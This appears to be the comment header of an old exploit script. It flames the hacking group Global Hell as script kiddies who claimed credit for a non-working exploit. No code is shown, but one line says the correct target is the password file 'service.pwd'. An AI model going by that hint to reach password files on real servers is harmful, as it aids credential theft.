# The gH version doesnt even work lamers.
# its service.pwd, not administrator.pwd

# <flame>
# Okay to start off, gH (Global Hell) flat out sucks.
# You are a bunch of DoS freaks, Fighting gimps
# Publicity whores, and Script Kiddies.
#
# 99% of you dont even know C to notice your "crew"
# member did not find this exploit nor make the
# "Exploit", all he did was open a http site...
# and you think you owned jap servers w/ a non
# working progam... or are you trying to cover
# up for all your script kiddies in the crew who
# use named, imapd and mountd exploits all day.
# Even if you used this, you still are nothings.
#
# So my point is made, you are trying to take
# credit for what you are not and coders are not
# what you are.
#
# Also untill any of you can code something in
# C that does what im doing in a shell script
# faster + better than me, you are still nothings.
# ps, beside DoS utils.
#
# Oh and we all fear your web page haxxoring skills...
# It takes real talnet to make a cheesy html file.
# I'm sure we'll see one about this too, cause your
# ego's are at 10 and your skills are at 0.
